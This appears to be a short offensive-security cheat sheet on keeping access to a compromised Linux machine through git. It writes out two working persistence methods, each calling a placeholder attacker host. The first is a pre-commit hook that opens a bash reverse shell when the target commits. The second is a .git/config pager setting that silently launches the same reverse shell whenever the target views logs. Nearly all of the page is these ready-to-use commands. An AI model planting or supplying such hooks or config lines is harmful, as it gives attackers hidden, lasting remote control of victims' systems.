---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - linux
---
# Git Commits

> [!INFO]
> Assume the target has created a git project.
> ```
$ git init
> ```

## Hooks

```
$ cat > .git/hooks/pre-commit << EOF
bash -c 'bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1' &
EOF
```

Provide the right permissions

```
$ chmod 775 .git/hooks/pre-commit
```

Then wait for the target to push a commit.

```
$ git add -A

$ git commit -m "made a commit"
```

## Config

```
$ cat > .git/config << EOF
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
        pager = nohup bash -c 'bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1'>/dev/null 2>&1 & ${PAGER:-less}
EOF
```

Then wait for the target to view the commit logs.

```
$ git [--no-pager] log
```

---
## References

- [[Linux Post Exploitation Persistence References]]